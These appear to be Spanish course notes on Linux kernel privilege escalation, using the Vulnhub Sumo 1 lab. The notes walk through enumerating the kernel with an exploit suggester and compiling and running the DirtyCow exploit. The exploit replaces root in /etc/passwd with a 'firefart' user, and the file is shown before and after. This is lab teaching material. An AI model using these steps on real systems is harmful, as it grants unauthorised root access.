# Explotación del Kernel

Tags: #Linux #Kernel  #Escalada #Root #Privilegios 

El **Kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el Kernel puede tener graves consecuencias para la seguridad del sistema.

En versiones antiguas del Kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.

La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario (**root**), cuando solo tienen permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el Kernel para obtener acceso de superusuario y, posteriormente, comprometer el sistema.

Las vulnerabilidades del Kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al Kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del Kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el Kernel.

Para mitigar el riesgo de vulnerabilidades del Kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.

A continuación, se os comparte el enlace a la máquina Sumo 1 de Vulnhub, la cual estaremos desplegando en esta clase para mostrar un ejemplo práctico de explotación del Kernel:

- **Máquina Sumo 1**: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

## Kernel

[Linux Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```bash 
# Descargar 'Linux Suggester' 
❯ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 
```

```bash 
❯ lse.sh -l 1 -i    # Enumeramos con la herramienta   
```

## DirtyCow2

* [DirtyCow2](https://www.exploit-db.com/exploits/40839)

```bash 
❯ apt install gcc                          # Instalar el GCC
```

```bash 
# Se puede usar en el Kernel 2.6.22 < 3.9
❯ gcc -pthread dirty.c -o dirty -lcrypt     # compilar el binario y nos regresa un nuevo archivo llamado 'dirty'
❯ chmod +x dirty 
❯ ./dirty <passwd>                          # Ejecutamos el binario y le colocamos la passwd que queramos

# Este binario nos va a crear un usuario llamado 'firefart' y lo reemplazara en el usuario 'root' 

❯ su firefart                               # Colocamos la passwd que ingresamos al momento de ejecutarlo y ahora seremos root
❯ ssh firefart@<IP>                         # Tambien podemos ingresar por SSH
	❯ ssh-keygen -f "/homekali/.ssh/known_hosts" -R "<IP>" # Si nos da un problema al momento de ingresar por SSH, colocamos ese 
```

```bash 
❯ sysinfo             # Nos muestra informacion de Linux, asi como la version del Kernel 
❯ getuid              # Nos muestra el username del servidor 

❯ lsb_release -a                                               
❯ uname -a            # Para ver la Version e informacion del Kernel 

Nota: La versión antigua de 'Kernel 3.2.0-23' es explotable

```

```python 
# Lo que hace este exploit es que por medio de la vulnerabilidad de 'race condition' crea un nuevo usuario hasta arriba del '/etc/passwd' y sustituye root por otro usuario llamado 'firefart' y la passwd es la que tu le indicas al script al momento de ejecutarlo.

❯ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

# Nota: A veces tarda un poco en que te regrese la consola. 
```

```python 
❯ cat /etc/passwd

firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

```bash 
❯ su firefart                     # Cambiamos de usuario y le colocamos la passwd que colocamos en el script
❯ whoami                          # Nos muestra que somos el usuario firefart
❯ id                              # Miramos que el id = 0, o sea que somos root 
```